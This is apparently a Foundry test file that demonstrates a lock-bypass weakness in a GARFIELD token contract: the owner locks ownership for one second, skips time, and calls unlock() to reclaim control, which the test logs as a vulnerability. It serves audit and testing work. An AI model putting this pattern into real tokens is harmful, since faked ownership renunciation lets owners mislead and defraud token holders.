// SPDX-License-Identifier: MIT
pragma solidity 0.6.8;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

contract MockFactory {
    function createPair(address tokenA, address tokenB) external pure returns (address) {
        tokenA;
        tokenB;
        return address(0xCAFE);
    }
}

contract MockRouter {
    address public factory;
    address public weth;

    constructor(address _factory, address _weth) public {
        factory = _factory;
        weth = _weth;
    }

    function WETH() external view returns (address) {
        return weth;
    }
}

import "../src/GARFIELD.sol";

contract GarfieldLockTest is Test {
    GARFIELD token;
    address owner = address(0x1);
    address constant WETH_ADDRESS = address(0xdead);

    function setUp() public {
        MockFactory factory = new MockFactory();
        MockRouter router = new MockRouter(address(factory), WETH_ADDRESS);
        
        vm.startPrank(owner);
        token = new GARFIELD(payable(address(router)));
        vm.stopPrank();
    }

    function testLockBypass() public {
        // Capture initial state
        console.log("--- BEFORE-Trigger Lock ---");
        address initialOwner = token.owner();
        console.log("Initial owner: ", initialOwner);
        
        console.log("--- Trigger Lock ---");
        vm.prank(owner);
        token.lock(1);  // Lock for 1 second
        skip(2);       // Fast forward to bypass lock period

        console.log("--- AFTER-Trigger Lock ---");
        address lockedOwner = token.owner();
        console.log("Owner after lock: ", lockedOwner);
        
        console.log("--- BEFORE-Trigger Unlock ---");
        console.log("Owner before unlock: ", lockedOwner);
        
        console.log("--- Trigger Unlock ---");
        vm.prank(owner);
        token.unlock();

        console.log("--- AFTER-Trigger Unlock ---");
        address unlockedOwner = token.owner();
        console.log("Owner after unlock: ", unlockedOwner);
        
        // Vulnerability verdict
        console.log("--- Verdict ---");
        if (lockedOwner == address(0) && unlockedOwner == initialOwner) {
            console.log("Vulnerability Exists: Lock bypass allows original owner to regain ownership after lock period");
        } else {
            console.log("Vulnerability not Exist: Lock mechanism functions as expected");
        }
    }
}